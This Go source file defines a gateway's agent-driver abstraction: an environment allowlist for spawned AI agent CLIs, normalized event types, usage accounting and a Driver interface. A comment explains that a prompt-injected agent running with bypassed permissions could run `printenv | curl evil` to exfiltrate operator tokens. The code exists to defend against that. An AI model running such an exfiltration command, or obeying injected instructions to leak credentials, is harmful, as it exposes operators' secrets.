// Package agent defines the agent-driver abstraction that replaces the
// claude-agent-sdk binding. Each agent (Claude, Codex, Gemini, …) is driven by
// spawning its CLI / app-server and normalizing its output into a single
// AgentEvent stream. The rest of the gateway (router, session-store, cron,
// stream-relay) depends only on this package — never on a specific agent.
package agent

import (
	"context"
	"os"
	"strings"
)

// envAllowlist is the small set of operator-environment variables the agent
// subprocess needs to function correctly. Anything outside this list is
// dropped before the child sees it.
//
// Why an allowlist instead of pass-through: `claude` (and any sibling driver
// invoked here) runs with `--permission-mode bypassPermissions` plus Bash
// tool access — a prompt-injected agent can `printenv | curl evil`. The
// daemon's own `os.Environ()` is the operator's full shell environment, so
// pass-through hands every `AWS_*`, `GH_TOKEN`, `GITHUB_TOKEN`,
// `OPENAI_API_KEY`, `SSH_AUTH_SOCK`, `AZURE_*`, `GCP_*`, … straight to a
// process running attacker-controlled instructions. Rounds 4-5 took care to
// keep the control-bus capability token off env (stdin only) and to feed
// octo-cli tokens on stdin too; that hardening was effectively negated by
// the agent inheriting the parent env wholesale.
//
// The allowlist is the minimum set we've found empirically lets `claude`
// spawn, locate its CLI deps, and read user-facing locale/time. Additional
// per-bot env (ANTHROPIC_*, OCTO_*, CLAUDE_CONFIG_DIR, …) flows through the
// `extra` parameter, NOT via inheritance. Operators with unusual setups can
// extend the list, but the default is fail-closed.
var envAllowlist = map[string]struct{}{
	"HOME":              {}, // ~/.claude lookups, ~/.npmrc, etc.
	"USER":              {}, // some CLIs read it for prompts/log lines
	"LOGNAME":           {}, // POSIX alias for USER
	"PATH":              {}, // resolve `node`, `git`, `claude`, etc.
	"TMPDIR":            {}, // child writes scratch files
	"TMP":               {}, // Windows analogue
	"TEMP":              {}, // Windows analogue
	"LANG":              {}, // locale; affects message formatting
	"LC_ALL":            {}, // locale override
	"LC_CTYPE":          {}, // locale subset commonly set on macOS
	"TZ":                {}, // time zone
	"TERM":              {}, // some CLIs check before printing ANSI
	"SSL_CERT_FILE":     {}, // CA bundle override
	"SSL_CERT_DIR":      {}, // CA bundle override
	"NODE_PATH":         {}, // node module resolution for claude
	"NODE_OPTIONS":      {}, // operator-tuned node flags
	"NPM_CONFIG_PREFIX": {}, // npm-installed claude lookups
	// Corporate proxies — universally honored by node, curl, and the
	// Anthropic SDK. NOT secrets; dropping them silently breaks claude
	// connectivity in any proxied enterprise environment.
	"HTTP_PROXY":  {},
	"HTTPS_PROXY": {},
	"NO_PROXY":    {},
	"http_proxy":  {},
	"https_proxy": {},
	"no_proxy":    {},
}

// mergedEnv returns the agent's spawn environment: the allowlisted subset of
// the daemon's os.Environ() with `extra` (KEY=VALUE entries) layered on top,
// later entries winning so callers put overrides (e.g. ANTHROPIC_BASE_URL)
// last. See envAllowlist for why pass-through was retired.
//
// Variables starting with LC_ are auto-included (POSIX locale family).
// A nil/empty extra returns just the allowlisted base.
func mergedEnv(extra []string) []string {
	base := os.Environ()
	out := make([]string, 0, len(base)+len(extra))
	for _, e := range base {
		eq := strings.IndexByte(e, '=')
		if eq <= 0 {
			continue
		}
		k := e[:eq]
		if _, ok := envAllowlist[k]; ok || strings.HasPrefix(k, "LC_") {
			out = append(out, e)
		}
	}
	out = append(out, extra...)
	return out
}

// EventKind classifies a normalized agent event.
type EventKind string

const (
	KindSessionStarted EventKind = "session_started" // carries a SessionID for resume
	KindTextDelta      EventKind = "text_delta"      // a chunk of assistant text
	KindThinking       EventKind = "thinking"        // extended-thinking text (optional)
	KindToolUse        EventKind = "tool_use"        // the agent invoked a tool
	KindToolResult     EventKind = "tool_result"     // a tool returned
	KindTurnDone       EventKind = "turn_done"       // the turn completed (carries usage)
	KindError          EventKind = "error"           // recoverable or terminal error
	KindSystem         EventKind = "system"          // init / retry / hook — informational
)

// AgentEvent is the single normalized currency between any driver and the
// gateway. Drivers translate their agent's native protocol into these.
//
// AgentEvent has NO JSON tags by design: it never crosses a wire boundary.
// The control bus uses the camelCase types in core/control/wire (mapped from
// AgentEvent in control/sink.go), and the IM connector reads typed Go fields
// directly. Adding json tags here would advertise a contract this struct
// doesn't own (and the snake_case style would diverge from the wire's
// camelCase).
type AgentEvent struct {
	Kind EventKind

	// Text carries assistant/thinking text for KindTextDelta / KindThinking.
	// The driver emits one event per complete content block (plain stream-json,
	// no token-level partials), so consumers append text without de-duplication.
	Text string

	// SessionID is set on KindSessionStarted (used to resume next turn).
	SessionID string

	// Tool fields for KindToolUse / KindToolResult.
	ToolName   string
	ToolParams string // truncated one-liner, for progress UI

	// Usage on KindTurnDone.
	Usage *TokenUsage

	// Err on KindError.
	Err         string
	Recoverable bool
	// ResumeInvalid marks a KindError caused by an unknown/stale resume id (the
	// agent's stored session no longer exists, e.g. after the config dir
	// changed). The gateway clears the resume mapping and retries fresh.
	ResumeInvalid bool
	// Transient marks a KindError caused by an upstream rate-limit / overload /
	// usage-cap condition (HTTP 429/503/529, "overloaded", "usage limit
	// reached", …) rather than a bug in the turn. The gateway surfaces a
	// distinct "服务繁忙" reply for these so the user knows to retry later.
	// RetryHint carries the human-readable reset window the agent reported
	// ("resets at 3pm"), when one was present.
	Transient bool
	RetryHint string

	// Raw holds the original line for debugging / forward-compat.
	Raw string
}

// TokenUsage is the per-turn token accounting, when the agent reports it.
// Like AgentEvent, this carries no JSON tags — accounting flows out via
// store.AddUsage + wire.UsageBody, not via direct serialization.
type TokenUsage struct {
	InputTokens  int
	OutputTokens int
	// CachedInputTokens is the portion of InputTokens served (read) from the
	// prompt cache (claude's cache_read_input_tokens) — cheap, cache hits.
	CachedInputTokens int
	// CacheCreationInputTokens is the input written into the prompt cache this
	// turn (claude's cache_creation_input_tokens) — cache writes, distinct from
	// reads (a write seeds the cache; a later read serves from it).
	CacheCreationInputTokens int
	// CostUSD is the agent-reported turn cost (claude's total_cost_usd). Zero
	// when unreported (e.g. subscription auth that omits cost).
	CostUSD float64
}

// Request is the agent-agnostic ask. Drivers map these onto their CLI flags.
// Tool/permission policy is NOT here: it's a fixed, claude-only headless
// invariant baked into ClaudeDriver (allowedTools=*, permissionMode=bypass).
type Request struct {
	Prompt       string
	SessionID    string // "" = new session; non-empty = resume
	Cwd          string // sandbox working directory
	MemoryDir    string // per-session auto-memory dir ("" = driver default location)
	Model        string // optional model override
	SystemAppend string // SOUL.md / security prefix appended to system prompt
}

// Capabilities advertises what a driver supports, so the gateway can adapt.
type Capabilities struct {
	Streaming  bool
	Resume     bool
	ToolEvents bool
}

// Driver is the contract every agent adapter implements. Query spawns the
// agent for one turn and streams normalized events until the channel closes.
type Driver interface {
	Name() string
	Capabilities() Capabilities
	Query(ctx context.Context, req Request) (<-chan AgentEvent, error)
}
